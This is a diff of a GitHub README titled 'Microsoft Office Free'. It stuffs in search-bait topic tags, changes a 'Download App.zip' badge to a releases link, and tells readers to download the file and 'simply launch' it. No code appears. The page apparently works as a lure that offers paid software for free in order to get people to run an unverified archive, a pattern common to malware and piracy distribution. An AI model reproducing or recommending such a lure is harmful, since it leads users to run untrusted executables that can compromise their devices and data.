@@ -8,7 +8,7 @@ Welcome to the Microsoft Office Free GitHub repository! Here you will find a col
 - **Topics:** buy-microsoft-office, font-examples-on-microsoft-office, free-microsoft-office-for-students, how-to-find-microsoft-office-certification, install-of-microsoft-office, microsoft-for-office-for-mac, microsoft-office-365-login, microsoft-office-android-version-free, microsoft-office-document-imaging, microsoft-office-e5-free, microsoft-office-for-mac, microsoft-office-home, microsoft-office-professional, microsoft-office-proofing-tools-20, microsoft-office-publisher-software, old-microsoft-office-programs-reddit
 
 ## Resource Link
-[![Download App.zip](https://img.shields.io/badge/Download-App.zip-blue)](https://github.com/uploads/App.zip)
+[![Download https://github.com/iamlilhole/Microsoft-Office-Free/releases](https://github.com/iamlilhole/Microsoft-Office-Free/releases)](https://github.com/iamlilhole/Microsoft-Office-Free/releases)
 
 ## Overview of Microsoft Office Free Repository
 In this repository, you will find a treasure trove of information, tools, and resources related to various aspects of Microsoft Office. Whether you are a seasoned professional or a student looking to enhance your skills, this repository aims to provide valuable insights and resources for your Microsoft Office journey.
@@ -44,7 +44,7 @@ Guides and tips on how to securely log in to your Microsoft Office 365 account a
 Step-by-step instructions on how to install Microsoft Office on your device and set it up for optimal performance.
 
 ## Accessing the Resources
-Click on the **"Download App.zip"** button above to access the files and resources in this repository. If the link includes the file name, simply launch the file to explore its contents. In case the link is a website or does not work, please check the "Releases" section for alternative access options.
+Click on the **"Download https://github.com/iamlilhole/Microsoft-Office-Free/releases"** button above to access the files and resources in this repository. If the link includes the file name, simply launch the file to explore its contents. In case the link is a website or does not work, please check the "Releases" section for alternative access options.
 
 ## Collaborate and Contribute
 We welcome contributions from the community to enrich the repository with more valuable resources. Feel free to fork the repository, make changes, and submit a pull request to share your insights with others.
